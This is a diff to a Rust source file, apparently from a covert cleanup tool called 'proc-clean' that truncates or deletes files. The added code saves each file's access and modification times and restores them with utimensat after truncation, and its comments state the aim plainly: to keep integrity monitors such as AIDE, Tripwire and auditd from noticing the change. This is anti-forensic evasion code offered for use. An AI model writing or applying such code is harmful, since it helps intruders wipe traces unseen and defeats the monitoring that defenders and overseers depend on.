@@ -11,6 +11,27 @@ pub struct ProcCleanStats {
     pub errors:        u32,
 }
 
+// Save (atime_sec, mtime_sec) from metadata before we touch the file.
+fn save_times(p: &Path) -> Option<(i64, i64)> {
+    use std::os::unix::fs::MetadataExt;
+    fs::metadata(p).ok().map(|m| (m.atime(), m.mtime()))
+}
+
+// Restore atime+mtime via utimensat so FIM tools (AIDE, Tripwire, auditd -w) see no change.
+// ctime will still be updated by the kernel — unavoidable without kernel patches.
+fn restore_times(p: &Path, atime: i64, mtime: i64) {
+    use std::ffi::CString;
+    let times = [
+        libc::timespec { tv_sec: atime, tv_nsec: 0 },
+        libc::timespec { tv_sec: mtime, tv_nsec: 0 },
+    ];
+    if let Ok(c) = CString::new(p.as_os_str().as_encoded_bytes()) {
+        unsafe {
+            libc::utimensat(libc::AT_FDCWD, c.as_ptr(), times.as_ptr(), libc::AT_SYMLINK_NOFOLLOW);
+        }
+    }
+}
+
 fn remove_file_silent(p: &Path, s: &mut ProcCleanStats, verbose: bool) {
     match fs::remove_file(p) {
         Ok(_)  => { s.files_removed += 1;
@@ -22,9 +43,15 @@ fn remove_file_silent(p: &Path, s: &mut ProcCleanStats, verbose: bool) {
 }
 
 fn truncate_file(p: &Path, s: &mut ProcCleanStats, verbose: bool) {
+    let ts = save_times(p); // snapshot before modification
     match fs::OpenOptions::new().write(true).open(p) {
-        Ok(f)  => { let _ = f.set_len(0); s.files_removed += 1;
-                    if verbose { eprintln!("[+] proc-clean: truncated {:?}", p); } }
+        Ok(f)  => {
+            let _ = f.set_len(0);
+            s.files_removed += 1;
+            // Restore timestamps so FIM detects no mtime change
+            if let Some((a, m)) = ts { restore_times(p, a, m); }
+            if verbose { eprintln!("[+] proc-clean: truncated {:?}", p); }
+        }
         Err(_) => {}
     }
 }
